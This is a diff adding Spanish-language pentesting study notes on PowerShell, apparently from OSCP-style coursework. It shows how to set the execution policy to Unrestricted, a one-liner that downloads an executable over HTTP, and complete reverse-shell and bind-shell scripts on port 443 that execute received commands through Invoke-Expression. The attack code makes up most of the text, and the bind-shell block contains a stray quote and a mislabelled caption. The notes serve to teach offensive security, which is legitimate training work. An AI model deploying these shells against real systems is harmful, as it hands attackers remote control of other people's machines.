@@ -1,0 +1,70 @@
+### PowerShell
+Powershell
+
+Para ejecutar scripts en PowerShell debemos cambiar la política por defecto de ‘Restricted’ a ‘Unrestricted’, para que pueda tanto ejecutar scripts de PowerShell como cargar ficheros de configuración. Para ello se debe ejecutar PowerShell como administrador en la máquina Windows y ejecutar el comando:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy				# Para ver el valor asignado a la política
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+1. PowerShell File Transfers
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+• powershell
+   ◇ -c “<comando>” → Ejecuta el comando especificado
+      ▪ new-object <object> → Instancia un .Net Framework o un objeto COM. (System.Net.WebClient → Un WebClient se utiliza para acceder a recursos identificados por una URI y expone un método público llamado DownloadFile() que requiere 2 parámetros: la localización de la fuente y del destino)
+
+2. PowerShell Reverse Shells
+
+Para crear un reverse shell introducimos el siguiente código en un .txt en la máquina windows:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+$client = New-Object System.Net.Sockets.TCPClient('192.168.121.132',443);							# Se le asigna la IP y puertos de la máquina objetivo
+$stream = $client.GetStream();																		# 
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)											# Bucle while seguido de una llamada de cierre de conexión con el cliente
+{
+ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);					# Lee 
+ $sendback = (iex $data 2>&1 | Out-String );														# iex (Invoke-Expression) → Ejecuta cualquier string que recibe como comando
+ $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';												# Envía respuesta
+ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+ $stream.Write($sendbyte,0,$sendbyte.Length);
+ $stream.Flush();
+}
+$client.Close();
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Seguidamente lo ejecutamos con el comando:
+• powershell -c $(Get-Content <file>) → Esto ejecuta el comando contenido en el fichero especificado, en este caso el reverse shell.
+
+3. PowerShell Bind Shells
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);												# Listener escucha en localhost
+$listener.start();
+$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+	$sendback = (iex $data 2>&1 | Out-String );
+	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	$stream.Write($sendbyte,0,$sendbyte.Length);
+	$stream.Flush()};
+$client.Close();
+$listener.Stop()"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Seguidamente lo ejecutamos con el comando:
+• powershell -c $(Get-Content <file>) → Esto ejecuta el comando contenido en el fichero especificado, en este caso el reverse shell.
+
